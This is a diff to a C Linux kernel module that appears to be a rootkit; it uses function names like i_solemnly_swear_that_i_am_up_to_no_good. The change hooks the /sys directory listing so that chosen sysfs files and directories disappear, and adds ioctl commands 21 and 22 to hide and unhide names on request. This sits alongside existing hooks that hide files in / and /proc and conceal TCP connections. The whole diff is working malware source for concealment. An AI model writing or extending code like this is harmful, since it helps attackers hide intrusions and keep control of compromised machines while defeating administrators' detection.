@@ -18,10 +18,12 @@ static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
+static int (*sys_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 static int (*proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
 static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
+static int (*sys_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #define ITERATE_NAME readdir
 #define ITERATE_PROTO struct file *file, void *dirent, filldir_t filldir
 #define FILLDIR_VAR filldir
@@ -32,6 +34,7 @@ static int (*root_iterate)(struct file *file, void *dirent, filldir_t filldir);
 #else
 static int (*proc_iterate)(struct file *file, struct dir_context *);
 static int (*root_iterate)(struct file *file, struct dir_context *);
+static int (*sys_iterate)(struct file *file, struct dir_context *);
 #define ITERATE_NAME iterate
 #define ITERATE_PROTO struct file *file, struct dir_context *ctx
 #define FILLDIR_VAR ctx->actor
@@ -89,6 +92,8 @@ struct hidden_file {
 };
 
 LIST_HEAD(hidden_files);
+
+LIST_HEAD(hidden_sys_files);
 
 struct {
     unsigned short limit;
@@ -451,6 +456,35 @@ void unhide_file ( char *name )
     }
 }
 
+void hide_sys_file ( char *name )
+{
+    struct hidden_file *hf;
+
+    hf = kmalloc(sizeof(*hf), GFP_KERNEL);
+    if ( ! hf )
+        return;
+
+    hf->name = name;
+
+    list_add(&hf->list, &hidden_sys_files);
+}
+
+void unhide_sys_file ( char *name )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_sys_files, list )
+    {
+        if ( ! strcmp(name, hf->name) )
+        {
+            list_del(&hf->list);
+            kfree(hf->name);
+            kfree(hf);
+            break;
+        }
+    }
+}
+
 static int n_tcp4_seq_show ( struct seq_file *seq, void *v )
 {
     int ret = 0;
@@ -567,6 +601,30 @@ int n_root_iterate ( ITERATE_PROTO )
     hijack_pause(root_iterate);
     REPLACE_FILLDIR(root_iterate, n_root_filldir);
     hijack_resume(root_iterate);
+
+    return ret;
+}
+
+static int n_sys_filldir( void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
+{
+    struct hidden_file *hf;
+
+    list_for_each_entry ( hf, &hidden_sys_files, list )
+        if ( ! strcmp(name, hf->name) )
+            return 0;
+
+    return sys_filldir(__buf, name, namelen, offset, ino, d_type);
+}
+
+int n_sys_iterate ( ITERATE_PROTO )
+{
+    int ret;
+
+    sys_filldir = FILLDIR_VAR;
+
+    hijack_pause(sys_iterate);
+    REPLACE_FILLDIR(sys_iterate, n_sys_filldir);
+    hijack_resume(sys_iterate);
 
     return ret;
 }
@@ -924,6 +982,72 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                 break;
 
+            case 18:
+            case 19:
+            case 20:
+                break;
+
+            /* Hide sysfs file/directory */
+            case 21:
+                {
+                    char *name;
+                    struct s_file_args file_args;
+
+                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
+                    if ( ret )
+                        return 0;
+
+                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
+                    if ( ! name )
+                        return 0;
+
+                    ret = copy_from_user(name, file_args.name, file_args.namelen);
+                    if ( ret )
+                    {
+                        kfree(name);
+                        return 0;
+                    }
+
+                    name[file_args.namelen] = 0;
+
+                    DEBUG("Hiding sysfs file/dir %s\n", name);
+
+                    hide_sys_file(name);
+                }
+                break;
+
+            /* Unhide sysfs file/directory */
+            case 22:
+                {
+                    char *name;
+                    struct s_file_args file_args;
+
+                    ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
+                    if ( ret )
+                        return 0;
+
+                    name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
+                    if ( ! name )
+                        return 0;
+
+                    ret = copy_from_user(name, file_args.name, file_args.namelen);
+                    if ( ret )
+                    {
+                        kfree(name);
+                        return 0;
+                    }
+
+                    name[file_args.namelen] = 0;
+
+                    DEBUG("Unhiding sysfs file/dir %s\n", name);
+
+                    unhide_sys_file(name);
+
+                    kfree(name);
+                }
+                break;
+
+
             default:
                 break;
         }
@@ -962,6 +1086,10 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     /* Hook / for hiding files and directories */
     root_iterate = get_vfs_iterate("/");
     hijack_start(root_iterate, &n_root_iterate);
+
+    /* Hook /sys for hiding files and directories */
+    sys_iterate = get_vfs_iterate("/sys");
+    hijack_start(sys_iterate, &n_sys_iterate);
 
     /* Hook /proc/net/tcp for hiding tcp4 connections */
     tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
@@ -1030,6 +1158,7 @@ static void __exit mischief_managed ( void )
     hijack_stop(tcp6_seq_show);
     hijack_stop(tcp4_seq_show);
     hijack_stop(root_iterate);
+    hijack_stop(sys_iterate);
     hijack_stop(proc_iterate);
 }
 
